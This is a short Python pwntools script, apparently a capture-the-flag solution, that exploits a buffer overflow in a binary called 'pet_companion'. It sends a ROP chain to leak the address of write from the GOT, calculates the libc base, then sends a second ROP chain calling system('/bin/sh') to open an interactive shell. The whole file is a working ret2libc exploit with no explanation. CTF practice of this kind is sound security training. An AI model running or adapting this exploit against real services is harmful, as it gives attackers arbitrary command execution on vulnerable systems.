import pwn

elf_path = './pet_companion'
pwn.context.binary = elf_path

elf = pwn.ELF(elf_path)  # Load the binary using pwntools' ELF class

libc = pwn.ELF("./glibc/libc.so.6")
p = pwn.process(elf_path)

rop = pwn.ROP(elf)
rop.write(1, elf.got['write'])
rop.main()

payload = b"A" * 0x48 + rop.chain()
p.sendlineafter(b"status", payload)
print(payload)

p.recvuntil("Configuring...\n\n")
write_leak = pwn.u64(p.recv(6).ljust(8, b'\x00'))
print(f"{hex(write_leak)=}")

libc.address = write_leak - libc.symbols['write']  # Calculate libc base address

rop = pwn.ROP(libc)  # Create a new ROP object based on libc
rop.system(next(libc.search(b"/bin/sh\x00")))

payload = b"A" * 0x48 + rop.chain()
print(payload)
p.sendlineafter(b"status", payload)

p.interactive()
